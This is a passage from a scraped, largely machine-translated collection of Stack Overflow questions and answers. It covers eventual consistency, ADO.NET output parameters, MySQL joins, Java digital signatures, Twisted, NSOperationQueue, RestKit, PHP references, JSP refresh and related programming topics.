[![在此处输入图像描述](../Images/1ae7874e35a442be837917165fa3c340.png)](https://i.stack.imgur.com/YXrX3.jpg)

然后应用程序将数据同步到下面显示的其他副本

[![在此处输入图像描述](../Images/57ecf003e1cf27727f1f8ebdf63c3b34.png)](https://i.stack.imgur.com/PvJQK.jpg)

同时，新客户端将从一个尚未更新的副本中获取数据。在这种情况下，他无法获得正确的最新数据。因为同步需要一些时间。在那种情况下，它**最终没有一致性**

问题是我们如何才能**最终保持一致性**？

为此，我们使用中介应用程序来更新/创建/删除数据并使用直接查询来读取数据。这有助于**最终保持一致性**

[![在此处输入图像描述](../Images/2e8e4f26b46a2aa005e2eea9f6c173cf.png)](https://i.stack.imgur.com/tb2do.jpg) [![在此处输入图像描述](../Images/50b7f56a77f884ffee84f07ef1ad6f02.png)](https://i.stack.imgur.com/D0hLi.jpg)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-11-11T07:12:30.857

当应用程序对一台机器上的数据项进行更改时，该更改必须传播到其他副本。由于更改传播不是即时的，因此在一段时间内，一些副本将具有最新的更改，而其他副本则不会。换句话说，副本将相互不一致。但是，更改最终会传播到所有副本，因此称为“最终一致性”。最终一致性一词只是承认将在一台机器上所做的更改传播到所有其他副本时存在无限延迟。最终一致性在集中式（单副本）系统中没有意义或相关，因为不需要传播。

来源：[http ://www.oracle.com/technetwork/products/nosqldb/documentation/consistency-explained-1659908.pdf](http://www.oracle.com/technetwork/products/nosqldb/documentation/consistency-explained-1659908.pdf)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-10-18T11:02:39.857

最终一致性意味着更改需要时间来传播，并且在每次操作之后数据可能不会处于相同的状态，即使对于相同的操作或数据转换也是如此。当人们在与这样的系统交互时不知道自己在做什么时，这可能会导致非常糟糕的事情发生。

在您充分理解此概念之前，请不要实施关键业务文档数据存储。搞砸文档数据存储实现比关系模型更难修复，因为将要搞砸的基本事物根本无法修复，因为修复它所需的事物只是不存在于生态系统中。重构飞行存储的数据也比 RDBMS 的简单 ETL 转换困难得多。

并非所有文档存储都是一样的。现在有些（MongoDB）确实支持某种事务，但迁移数据存储可能与重新实现的费用相当。

警告：开发人员甚至架构师不了解或不了解文档数据存储技术，并且因为害怕失去工作而不敢承认这一点，但他们接受过 RDBMS 的经典培训，并且只知道 ACID 系统（这有多大的不同呢？ ?) 不了解该技术或不花时间学习它的人会错过设计文档数据存储的机会。他们也可能会尝试将其用作 RDBMS 或用于缓存等用途。他们会将应该对整个文档进行操作的原子事务分解为“关系”片段，忘记复制和延迟是事情，或者更糟糕的是，将第三方系统拖入“事务”。他们这样做是为了让他们的 RDBMS 可以镜像他们的数据湖，不管它是否会工作，也不需要测试，因为他们知道自己在做什么。然后，当存储在像“订单”这样的单独文档中的复杂对象的“订单项目”比预期的要少，或者根本没有时，他们会感到惊讶。但这不会经常发生，也不会经常发生，所以他们只会向前迈进。他们甚至可能无法解决开发中的问题。然后，他们不会重新设计事物，而是会抛出“延迟”、“重试”和“检查”来伪造一个关系数据模型，这不起作用，但会增加额外的复杂性而没有任何好处。但现在为时已晚 - 事情已经部署，现在业务正在运行。最终，整个系统将被淘汰，部门将外包，由其他人维护。它仍然无法正常工作，但它们的失败可能比当前的失败更便宜。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-10-31T07:58:56.343

用简单的英语，我们可以说：尽管您的系统可能处于不一致的状态，但目标始终是在某个点为每条数据达到一致性。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-10-31T12:02:41.070

最终一致性更像是一个频谱。一方面你有很强的一致性，另一方面你有最终的一致性。在这之间有一些级别，例如快照、阅读我的写入、有限的陈旧性。[道格·特里在他关于棒球最终一致性的论文](http://research.microsoft.com/pubs/157411/ConsistencyAndBaseballReport.pdf)中有一个很好的解释 。

根据我的说法，最终一致性基本上是每次从数据存储中读取时以随机顺序对随机数据的容忍度。比这更好的是更强大的一致性模型。例如，快照具有陈旧数据，但如果再次读取将返回相同的数据，因此它是可预测的。有时应用程序可以容忍在给定时间内过时的数据，超过该时间它需要一致的数据。

如果您查看一致性的含义，它更多地与一致性或缺乏偏差有关。因此，在非计算机系统术语中，它可能意味着对意外变化的容忍度。通过ATM可以很好地解释。ATM 可能离线，因此与核心系统的账户余额不同。但是，可以容忍在一段时间内显示不同的余额。一旦 AT​​M 上线，它就可以与核心系统同步并反映相同的余额。因此，可以说 ATM 是最终一致的。

# wcf - 使用 WCF 路由 (.Net 4.0) 和 IIS7 负载平衡（应用程序请求路由）有什么区别？

> ID：10078551
> 
> 赞同：1
> 
> 时间：2012-04-09T19:22:57.770
> 
> 标签：wcf, iis, load-balancing

WCF 路由有可能管理负载平衡和故障转移，但我读过它不应该用于此目的

**使用WCF 路由**功能（.Net 4.0）和**IIS7 负载平衡**（应用程序请求路由模块）有什么区别？

# sql-server - ADO.Net 和存储过程输出参数

> ID：10078553
> 
> 赞同：0
> 
> 时间：2012-04-09T19:22:58.953
> 
> 标签：sql-server, stored-procedures, ado.net

在 Ado.net 中，代码调用带有输入和输出参数的存储过程。

我知道如果某些输入参数是可选的（在 SP 中有默认值），除非需要，否则代码不需要定义和发送参数值。

我的问题是：这同样适用于可选的输出参数吗？代码可以忽略可选的（具有默认值）SP 输出参数吗？

我本可以自己测试它，但我现在没有一个可行的例子，而且我的时间很短。

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:39:39.960

是的。如果参数具有默认值，则可以安全地省略它，与参数方向（INPUT 或 OUTPUT）无关。从 ADO.Net 调用该过程这一事实完全无关紧要。例如：

```
create procedure usp_test
    @a int = 1 output,
    @b int = 2
as
begin
    set @a = @b;
end 
go

exec usp_test 
```

从业务规则的角度来看是否安全（即忽略 OUTPUT 参数返回值），完全取决于过程和您的应用程序的具体情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T19:27:56.347

**编辑**：原来我在这里错了，但我会留下我的答案，因为信息`SqlParameter`可能有用。对不起，虽然不准确。

我不相信。您必须发送一个`OUTPUT`参数，在 ADO.NET 中，这是通过添加一个`SqlParameter`将其`ParameterDirection`属性设置为`ParameterDirection.Output`.

[http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparameter.direction.aspx](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlparameter.direction.aspx)

[http://msdn.microsoft.com/en-us/library/system.data.parameterdirection.aspx](http://msdn.microsoft.com/en-us/library/system.data.parameterdirection.aspx)

# php - MYSQL 获取分配给多个“类别”的结果可能使用 JOIN？

> ID：10078555
> 
> 赞同：5
> 
> 时间：2012-04-09T19:23:08.797
> 
> 标签：php, mysql, join, tags, categories

我是 mysql 世界的新手，我在从数据库中获取所需数据时遇到了一些麻烦。

我有的2张桌子是......

**结果**

```
ID   | TITLE | LOTS OF OTHER DATA |
1    | res1  |                    |
2    | res2  |                    | 
3    | res3  |                    |
4    | res4  |                    | 
5    | res5  |                    | 
```

**类别**

```
ID   | RESULT_ID |    CATEGORY NAME    |
1    | 1         |      purchase       |
2    | 1         |    single_family    | 
3    | 1         |    conventional     |
4    | 2         |        usda         | 
5    | 3         |    somecategory     | 
```

我正在尝试创建一个查询，该查询将选择属于查询中提供的所有类别的结果。例如，在本例中查询 purchase & single_family & 常规将返回结果表中的第一个结果。

那有意义吗？是否有可以执行此操作的查询，或者这是否是我的数据库结构的更多问题？

非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T19:29:39.603

尝试这样的事情：

```
SELECT * FROM Results r 
INNER JOIN Categories c on r.ID = c.RESULT_ID
WHERE c.name in ('purchase', 'single_family', 'conventional')
GROUP BY r.ID
HAVING COUNT(c.ID) = 3 
```

带有连接的基本选择只会为结果 1 提供三行。

编辑：为确保您的代码在更改数据库时不会中断，您应该始终明确选择您想要的字段：`SELECT r.ID, .. FROM ..`

因此，您基本上是对所有类别的所有类别表进行简单连接，其中类别名称是列表中的名称之一。尝试手动运行前 3 行以查看得到的结果。

接下来，您按结果 id 分组。这意味着您将共享相同结果 id 的所有行聚合到一行中。最后一行表示我们正在过滤按 3 行聚合的聚合列。这意味着您将只返回具有 3 个匹配类别的结果。

因此，这种方法的唯一问题是，如果您的 Categories 表中有重复的 result_id、categoryname。

# java - 使用公钥进行数字签名

> ID：10078561
> 
> 赞同：4
> 
> 时间：2012-04-09T19:23:33.893
> 
> 标签：java

据我了解，数字签名是通过使用您自己的私钥和收件人的公钥加密（消息摘要）来获得的。

在 Java 中，我不知道如何使用公钥来执行第二阶段的签名。

```
Signature sig = Signature.getInstance("MD5WithRSA");
sig.initSign(privateKey);
sig.update(data);
byte[] signatureBytes = sig.sign(); 
```

我检查了 API，唯一使用公钥的方法是用于验证......

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-09T19:30:51.950

消息签名中不涉及收件人。如果您想阻止其他人验证签名，您可以将签名加密为收件人的公钥，但这通常不被视为签名消息的一部分。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:39:30.350

在公钥密码学中：

*   私钥用于*签名*和*解密/解密*。

*   公钥用于*验证签名*和*加密/加密*。

请参阅[TLS 规范的词汇表](https://www.rfc-editor.org/rfc/rfc4346#appendix-B)：

> 公钥密码术：一类使用双密钥密码的密码技术。用公钥加密的消息只能用相关的私钥解密。相反，用私钥签名的消息可以用公钥来验证。

尽管 RSA 用于签名的数学运算与用于加密的数学运算非常相似（因为签名或多或少与“加密”摘要相同），但并非所有算法（例如 DSA）都是如此。此外，混合术语会导致您的整体安全推理出现问题。

您在这里所做的是唯一的签名阶段。除此之外，您可能还想加密消息（使用收件人的公钥），但这是一个独立的操作。你可能想看看`Cipher`这样做。当然，您想要加密的不仅仅是您之前获得的签名，还有初始消息及其签名的串联。（我不确定仅加密签名是否有任何意义。）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-09T19:31:29.970

没有使用收件人公钥加密数字签名这样的步骤；在这种情况下，它不会是（通用）数字签名，因为只有接收者才能解密（并因此检查）它。

所以，是的（不知道 Java 的细节），我并不感到惊讶 API 只提供创建一个需要你的私有 RSA 密钥的函数，而接收者需要你的公共 RSA 密钥来检查你的签名，这是第二部分你提到的API。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T19:32:52.607

“第二阶段”是什么意思，用私钥加密哈希或验证签名？

调用后粘贴的代码已经给你签名`update()`。签名对象已经进行了散列（MD5）并使用私钥（RSA）加密。

要验证签名，您只需遵循[此处描述的对称步骤](http://docs.oracle.com/javase/tutorial/security/apisign/vstep4.html)

# jquery-plugins - starting smoothdivscroll at random position

> ID：10078563
> 
> 赞同：-1
> 
> 时间：2012-04-09T19:23:51.173
> 
> 标签：jquery-plugins, random, smooth-scrolling

I am using smoothdivscroll plugins. I want to start scrolling at different position f text when page is reloaded or refreshed. How can I do this?

Thanks.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T08:24:45.513

您必须自己为这个特殊功能编写一些代码。SmoothDivScroll 有一个选项**startAtElementId**，您可以使用它来告诉滚动条从某个元素 (id) 的位置开始。如果您在服务器端动态加载滚动条的内容（使用 PHP、ASP.NET 或类似的东西），您可以让服务器端代码选择其中一个内容元素并向其添加某个 id。然后你会像这样设置选项：

```
<script type="text/javascript">
   $(document).ready(function() {
      $("#makeMeScrollable").smoothDivScroll({ 
         startAtElementId: "yourID"
      });
   });
</script> 
```

您也可以使用方法**jumpToElement**。首先，您将初始化插件。然后直接在您调用 jumpToElement 并告诉它跳转到一个随机数介于 1 和您已加载的元素总数之间的元素之后。这没有以任何方式进行测试，但我认为它看起来像这样：

```
<script type="text/javascript">
   $(document).ready(function() {
      // Initialize the plugin
      $("#makeMeScrollable").smoothDivScroll();

      // Randomize an element
      var numberOfElements = $("#scrollableArea *").length;
      var randomNumber = Math.floor(Math.random() * numberOfElements + 1 );
      $("#makeMeScrollable").smoothDivScroll("jumpToElement", "number", randomNumber);

   });
</script> 
```

正如我所说，上面的代码还没有经过测试，但是类似的东西应该可以工作。

祝你好运！

# python - counter of served clients in a simple server using python + twisted

> ID：10078564
> 
> 赞同：1
> 
> 时间：2012-04-09T19:23:51.230
> 
> 标签：python, twisted

Im using twisted to make a simple server that accepts multiple connections and i want to count the numbers of clients who have been connected. This counting im doing in the factory (as is logical) using clientConnectionMade() but doesn't update the value of the counter, really i dont know where it is my mistake. I appreciate a little help.

My Server code: (also in [http://bpaste.net/show/26789/](http://bpaste.net/show/26789/))

```
 import socket
 import datetime
 from twisted.internet import reactor, protocol
 from twisted.internet.protocol import Factory, Protocol

class Echo(protocol.Protocol):

def connectionMade(self):
    print "New client connected"

def dataReceived(self, data):
    print "Msg from the client received"
    if data == "datetime":
       now = datetime.datetime.now()
       self.transport.write("Date and time:")
       self.transport.write(str(now))
    elif data == "clientes":
       self.transport.write("Numbers of clients served: %d " % (self.factory.numClients))
    else:
       self.transport.write("msg received without actions")

class EchoFactory(Factory):

protocol = Echo

    def __init__(self):
        self.numClients = 0

    def clientConnectionMade(self):
       self.numClients = self.numClients+1

def main():
factory = EchoFactory()
factory.protocol = Echo
reactor.listenTCP(9000,factory)
reactor.run()

 # this only runs if the module was *not* imported
if __name__ == '__main__':
main() 
```

Doesnt show any error, just doesnt update the counter 'numClients' and i dont know why.

Thanks

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T16:28:11.327

clientConnectionMade（增加 self.numClients）[不是 Factory 类的有效方法](http://twistedmatrix.com/documents/12.0.0/api/twisted.internet.protocol.Factory.html)，因此框架永远不会调用它。

从 Echo.connectionMade() 方法内部调用 self.factory.numClients += 1 将起作用：

```
class Echo(protocol.Protocol):
    def connectionMade(self):
        print "New client connected"
        self.factory.numClients += 1 
```

你也可以重写你的工厂的 buildProtocol() 方法来做类似的事情。

# jquery - Multiple Iframes loaded asynchronously

> ID：10078565
> 
> 赞同：0
> 
> 时间：2012-04-09T19:24:00.587
> 
> 标签：jquery, asp.net, iis, iframe

I'm working on a new prototype for an application and I'm conducing some tests before starting. I'm trying to create many iframes in my page. I wrote this code in order to verify the asynchronously loading, but the behavior I'm experiencing is not what I expected.

Here the code I'm using:

```
<html>
   <head>
   <title>test</title>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
   <script type="text/javascript">
      function appendNew(container, location) {
         var chart = $("<iframe>")
            .attr('src', location)
            .css('width', 150)
            .css('height', 150);

         container.append(chart);
       }

    $(function () {                               
        var urls = ["http://local.test.com?test=1",
                    ...
                    "http://local.test.com?test=20"];

        var container = $("#testDiv");

        $.each(urls, function (idx, item) {
            appendNew(container, item);
        })
    })
    </script>

    </head>
    <body>
        <div id="testDiv"></div>
    </body>
</html> 
```

It's just a loop on a url array, some jQuery code will take care to append a new Iframe to the page for each one of them. All the urls point to the same page, it's just a simple asp.net page hosted by my local IIS 7.5 with the following code into the Page_Load:

```
Thread.Sleep(2000); 
```

What I expect is that all the iframes are loaded at the same time. The result I get is that they're loaded in sets of 6 (i.e. when 20: 6/6/6/2). Any reason/solution?

This behavior is the same on Chrome, Firefox and IE.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T19:43:48.137

您看到的问题与服务器的最大连接数有关。这是浏览器特定的编号，我相信，chrome 设置为 6。如果您将域更改为 iframe，您应该会看到加载更改。

```
<html>
   <head>
   <title>test</title>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
   <script type="text/javascript">
      function appendNew(container, location) {
         var chart = $("<iframe>")
            .attr('src', location)
            .css('width', 150)
            .css('height', 150);

         container.append(chart);
       }

       $(function () {
           var urls = [];

           var changeDomains = true;
           for (i = 1; i <= 20; i++) {
               if (changeDomains) {
                   urls[i] = "http://local" + i + ".test.com?test=" + i;
               }
               else {
                   urls[i] = "http://local.test.com?test=" + i;
               }
           }

           var container = $("#testDiv");

           $.each(urls, function (idx, item) {
               appendNew(container, item);
           })
       })
    </script>

    </head>
    <body>
        <div id="testDiv"></div>
    </body>
</html> 
```

# objective-c - use NSOperationQueue as a LIFO stack?

> ID：10078569
> 
> 赞同：8
> 
> 时间：2012-04-09T19:24:11.530
> 
> 标签：objective-c, ios, nsoperationqueue

i need to do a series of url calls (fetching WMS tiles). i want to use a LIFO stack so the newest url call is the most important. i want to display the tile on the screen now, not a tile that was on the screen 5 seconds ago after a pan.

i can create my own stack from a NSMutableArray, but i'm wondering if a NSOperationQueue can be used as a LIFO stack?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T05:35:16.787

您可以使用 设置操作队列中操作的优先级`-[NSOperation setQueuePriority:]`。每次添加操作时，您都必须重新调整现有操作的优先级，但您可以实现您正在寻找的东西。您基本上会降级所有旧的并给予最新的最高优先级。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T19:36:13.127

遗憾`NSOperationQueue`的是，我认为 s 顾名思义，只能用作队列，而不是堆栈。为了避免不得不做一大堆手动编组任务，可能最简单的方法是把你的队列当作不可变的并且通过复制来改变。例如

```
- (NSOperationQueue *)addOperation:(NSOperation *)operation toHeadOfQueue:(NSOperationQueue *)queue
{
    // suspending a queue prevents it from issuing new operations; it doesn't
    // pause any already ongoing operations. So we do this to prevent a race
    // condition as we copy operations from the queue
    queue.suspended = YES;

    // create a new queue
    NSOperationQueue *mutatedQueue = [[NSOperationQueue alloc] init];

    // add the new operation at the head
    [mutatedQueue addOperation:operation];

    // copy in all the preexisting operations that haven't yet started
    for(NSOperation *operation in [queue operations])
    {
        if(!operation.isExecuting)
            [mutatedQueue addOperation:operation];
    }

    // the caller should now ensure the original queue is disposed of...
}

/* ... elsewhere ... */

NSOperationQueue *newQueue = [self addOperation:newOperation toHeadOfQueue:operationQueue];
[operationQueue release];
operationQueue = newQueue; 
```

目前看来，释放仍在工作的队列（就像旧的操作队列会发生的那样）不会导致它取消所有操作，但这不是记录在案的行为，因此可能不值得信赖。如果你想真正安全，key-value 观察`operationCount`旧队列上的属性，当它变为零时释放它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T23:38:05.670

可悲的是，如果不遇到一些棘手的问题，您就无法做到这一点，因为：

> **重要**在运行操作或将它们添加到操作队列之前，您应该始终配置依赖项。之后添加的依赖项可能不会阻止给定的操作对象运行。*（来自：[并发编程指南：配置互操作依赖](https://developer.apple.com/library/content/documentation/General/Conceptual/ConcurrencyProgrammingGuide/OperationObjects/OperationObjects.html#//apple_ref/doc/uid/TP40008091-CH101-SW17)）*

看看这个相关的问题：[AFURLConnectionOperation 'start' 方法在它准备好之前被调用，之后再也不会被调用](https://stackoverflow.com/questions/14821406/afurlconnectionoperation-start-method-gets-called-before-it-is-ready-and-never)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-03T20:31:48.107

我不确定你是否还在寻找解决方案，但我同样的问题一直困扰着我一段时间，所以我继续在这里实现了一个操作堆栈：[https ://github.com/cbrauchli/ CBOperationStack](https://github.com/cbrauchli/CBOperationStack)。我已经使用它进行了数百次下载操作，并且效果很好。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-08-21T16:58:09.643

在 NSOperationQueue 之上找到了堆栈/LIFO 功能的简洁实现。它可以用作扩展 NSOperationQueue 或 NSOperationQueue LIFO 子类的类别。

[https://github.com/nicklockwood/NSOperationStack](https://github.com/nicklockwood/NSOperationStack)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-01-20T12:52:54.567

最简单的方法是将您的操作和您将要处理的数据分开，这样您就可以像往常一样向 NSOperationQueue 添加操作，然后从堆栈或您需要的任何其他数据结构中获取数据。

```
var tasks: [MyTask]
...

func startOperation() {
    myQueue.addOperation {
        guard let task = tasks.last else {
            return
        }

        tasks.removeLast()

        task.perform()
    }
} 
```

现在，显然，您可能需要确保可以同时使用任务集合，但是对于许多预制解决方案来说，这是一个比绕过 NSOperationQueue 执行顺序更常见的问题。

# iphone - IOS RESTKIT HTTP PUT example

> ID：10078570
> 
> 赞同：2
> 
> 时间：2012-04-09T19:24:21.133
> 
> 标签：iphone, ios, restkit, put

I want to update data in server which runs in REST API. i am using RESTKIT from ios device. But i could not find how to use PUT in restkit.

I have to send data like key:"user_id" value:"2" these format. Can anyone please help me to solve this problem.. :(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T20:33:05.147

SOKeyValue.h ：用作调用参数的序列化对象。

```
#import <Foundation/Foundation.h>

@interface SOKeyValue : NSObject
@property (nonatomic, retain) NSString* key;
@property (nonatomic, retain) NSString* value;
@end 
```

这是初始化 Restkit 的简化代码：

```
/*
 This part of code must be executed only one time in your application
*/
//To see logs
RKLogConfigureByName("RestKit/Network", RKLogLevelTrace);

//Init with good domain
RKObjectManager* manager = [RKObjectManager    objectManagerWithBaseURL:@"http://mydomain.dev/ui/v1"];

//Indicate to use JSON
[RKObjectManager sharedManager].serializationMIMEType = RKMIMETypeJSON;

//Route path when you call a PUT with SOKeyValue class
[manager.router routeClass:[SOKeyValue class] toResourcePath:@"/yourpath" forMethod:RKRequestMethodPUT];

//Serialization for SOKeyValue class
RKObjectMapping* keyvalueSerializationMapping = [RKObjectMapping mappingForClass:[NSMutableDictionary class] ];
[authSerializationMapping mapAttributes:@"key", @"value", nil];
[[RKObjectManager sharedManager].mappingProvider setSerializationMapping:keyvalueSerializationMapping  forClass:[SOKeyValue class] ]; 
```

现在我们可以实现一个使用 PUT 的服务。在将实现调用的对象中不要忘记 restkit 委托**RKObjectLoaderDelegate**：

```
#import <Foundation/Foundation.h>
#import <RestKit/RestKit.h>
#import "SOKeyValue.h"
@interface MyViewOrMyServiceObject: NSObject <RKObjectLoaderDelegate>
- (void)putKeyValue;
- (void)objectLoader:(RKObjectLoader*)objectLoader didLoadObjects:(NSArray*)objects;
- (void)objectLoader:(RKObjectLoader*)objectLoader didFailWithError:(NSError*)error;
@end 
```

在您的 (.m) 中：

```
- (void)putKeyValue 
{

    SOKeyValue *keyvalue = [[SOKeyValue alloc] init];
    keyvalue.key = @"k";
    keyvalue.value = @"2";
    [[RKObjectManager sharedManager] putObject:keyvalue delegate:self];
    [keyvalue release];
} 
```

您可以在跟踪中看到状态代码，并使用回调函数：

```
- (void)objectLoader:(RKObjectLoader*)objectLoader didLoadObjects:(NSArray*)objects;
- (void)objectLoader:(RKObjectLoader*)objectLoader didFailWithError:(NSError*)error; 
```

所以我家里没有MAC，很难帮助你了解代码结构。如果您有任何问题，请不要犹豫。

# jquery - How to fire an img resize event in jQuery when the window opens, not on window resize

> ID：10078588
> 
> 赞同：1
> 
> 时间：2012-04-09T19:26:00.600
> 
> 标签：jquery, image-resizing, window-resize

I have a script that resizes an image/div dynamically on window resize, but if the viewer opens the window less than full, the image is too large for the viewing area. Here's what I've got (you might find this familiar):

```
<script typ="text/javascript">
        $(window).resize(function() {
            var hgt = $(window).height() - 427;
            var wid = $(window).width() - 603;
            $('.slides_container img').css({
                width:'auto',
                height:hgt,
            });
            $('.slides_container img').css("max-height", 427);
            $('.slides_container img').css("max-width", 603);
            $('.slides_container').css("width", '100%');
            $('.slides_container').height(hgt-10);
        });
    </script> 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-09T19:31:15.613

将以下代码放在 </script> 上方：

```
$(document).ready($(window).resize()); 
```

# php - 在处理潜在的未定义变量时，在 PHP 中使用引用赋值是不好的做法吗？

> ID：10078591
> 
> 赞同：5
> 
> 时间：2012-04-09T19:26:04.050
> 
> 标签：php, reference, variable-assignment

我一直在考虑使用引用赋值作为处理潜在未定义变量的捷径。

换句话说，而不是：

```
$foo = isset($this->blah['something']['else']) ? $this->blah['something']['else'] : null;
if (!is_null($foo) && ...){
    //do something with $foo
} 
```

我可以这样做：

```
$foo = &$this->blah['something']['else'];
if (!is_null($foo) && ...){
    //do something with $foo
} 
```

看起来更简单，对吧？由于 PHP 通过引用处理分配的方式，我不必担心 $this->blah['something']['else'] 被定义，因为如果它不存在，它将自动创建并设置为空。

这种策略是否受到反对？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:46:23.967

我个人认为它**可能**更传统，但分配这样的引用值对我来说似乎有点多余。在您的情况下，我会坚持使用更常用的三元运算符。通常它更容易理解。当然，您应该尽可能地遵循您的个人语义。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:28:40.947

如果您只想测试是否设置了变量而不是 null，那么您最好测试：

```
if (! empty($this->blah['something']['else'])) {...} 
```

通过这种方式，您可以避免创建对一个甚至不存在的值的两个引用。

在我看来，每次创建对相同值的新引用时，您的代码都会变得难以一目了然。

如果您需要零作为非空，那么您最好创建一个像这样的全局函数：

```
function eempty(& $var) {
  return empty($var) && $var !== 0;
} 
```

# html - 定期刷新jsp页面

> ID：10078592
> 
> 赞同：0
> 
> 时间：2012-04-09T19:26:04.337
> 
> 标签：html, jsp

我创建了一个 jsp 页面，我在其中加载了一组带有数据库值的文本框。我需要每 5 秒刷新一次此页面。我尝试使用元标记，但它会导致注销。我猜是因为会话变量正在被破坏。有人可以指出我正确的方向吗？提前致谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T05:59:46.590

示例代码：

我在上一页设置了会话，并且在使用元标记自动刷新后得到它。

JSP：

```
<meta http-equiv="refresh" content="10; url=main.jsp">

 <%
    String title = "Welcome Back to my website";
    Integer visitCount = new Integer(0);
    String visitCountKey = new String("visitCount");
    String userIDKey = new String("userID");
    String userID = new String("No User");

    if (session.getAttribute(userIDKey)!=null){
        System.out.println("Found Session Attribute");
       visitCount = (Integer) session.getAttribute(visitCountKey);
        if(visitCount!=null)
            visitCount = visitCount + 1;
        else 
            visitCount = 1;
        userID = (String)session.getAttribute(userIDKey);
        session.setAttribute(visitCountKey,  visitCount);
    } else {
        System.out.println("New Session");
        title = "Welcome to my website"; 
        session.setAttribute(userIDKey, userID);
        session.setAttribute(visitCountKey,  visitCount);
    } 
```

%>

```
Hi <%= userID%> &nbsp; <%=title %>
Visit Count <%= visitCount%> 
```

# asp.net-mvc-3 - jquery File Upload (blueimp) - IE9 doesn't support multiple file selection?

> ID：10078595
> 
> 赞同：2
> 
> 时间：2012-04-09T19:26:15.967
> 
> 标签：asp.net-mvc-3, jquery-plugins, file-upload, multifile-uploader, blueimp

I'm using jquery file upload plugin per blueimp and IE9 is not allowing multiple file selection per the following code (below) or the demo:

[http://blueimp.github.com/jQuery-File-Upload/](http://blueimp.github.com/jQuery-File-Upload/)

Can somebody provide a workaround or insight?

View:

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script src="@Url.Content("~/Scripts/jquery.ui.widget.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.iframe-transport.js")" type="text/javascript"></script>
<script src="@Url.Content("~/Scripts/jquery.fileupload.js")" type="text/javascript"></script>

<input id="fileupload" type="file" name="files" multiple="multiple"/> 
```

Controller:

```
public class HomeController : Controller
{
    public ActionResult Index()
    {
        return View();
    }

    [HttpPost]
    public ActionResult Index(IEnumerable<HttpPostedFileBase> files)
    {
        foreach (var file in files)
        {
            var filename = Path.Combine(Server.MapPath("~/App_Data"), file.FileName);
            file.SaveAs(filename);
        }
        return View();
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T21:40:24.820

对于 Internet Explorer，您需要一个 flash 后备，plupload 可以做到这一点。

# c# - 在便携式区域获取呼叫/客户端程序集

> ID：10078598
> 
> 赞同：1
> 
> 时间：2012-04-09T19:26:34.400
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, asp.net-mvc-areas

我在便携式区域内执行了一个操作，该操作需要获取有关`Assembly`调用它的信息。便携式区域在项目`Core`中，由客户端应用程序引用`Client`。

`GetAssembly`并且`GetExecutingAssembly`都返回`Core`程序集：

```
// Both are Core
assembly = Assembly.GetAssembly(GetType());
assembly = Assembly.GetExecutingAssembly(); 
```

我的下一个想法是使用`GetCallingAssembly`，但这又带来了`Anonymously Hosted DynamicMethods Assembly.`

```
assembly = Assembly.GetCallingAssembly(); 
```

唯一的其他选项是`GetEntryAssembly`，它只是空：

```
assembly = Assembly.GetEntryAssembly(); 
```

我想要做的是`Client`使用内置框架获取对程序集的引用。显然，我可以使用一些花哨的依赖注入或其他不太复杂的方法来获取该操作的信息；但是，我想知道是否有更好的内置方法来做到这一点。

**澄清**：我想在这里得到的是客户端程序集的版本信息。我希望每个客户端都可以访问`VersionInfo`该`Core`区域中的部分并将构建版本信息添加到呈现的页面。因此，操作`Core`需要知道调用它的程序集，以便它可以反映版本信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T13:30:34.373

经过大量的努力和泪水，我确定 DI 将是做到这一点的最佳方式。为什么？

**关于可移植区域的一些信息**
经过一些研究和观察，可移植区域似乎运行在它们自己的 MVC 子实例中。我试图从我的便携式区域调用部分视图存在于我的客户端应用程序的视图中：

```
@Html.Action("Versions", "Core") 
```

`Version`如果我在Action in 中提取堆栈跟踪`Core`，我会得到：

> Core.Versions()
> 在 System.Web.Mvc...
> 在 System.Web.Mvc...
> 在 ASP._Page_Views_Shared_Layouts__Base_cshtml.Execute()
> 在 System.Web.Mvc... 在 ...

由于我的客户端应用程序中的所有控制器代码都已执行，因此堆栈跟踪中甚至不再有对该程序集的引用。我还尝试`Assembly`在操作中添加一个 arg `Versions`，例如：

```
@Html.Action("Versions", "Core", new { assembly = Assembly.GetExecutingAssembly() }) 
```

但由此产生的结果`App_Web_xq4cmhcy`显然是一个生成的程序集。

因此，真正剩下的唯一选择是添加一个 DI 容器，该容器在每个客户端应用程序的 Global.asax 中使用执行程序集进行初始化，然后可由 Core 方法读取。

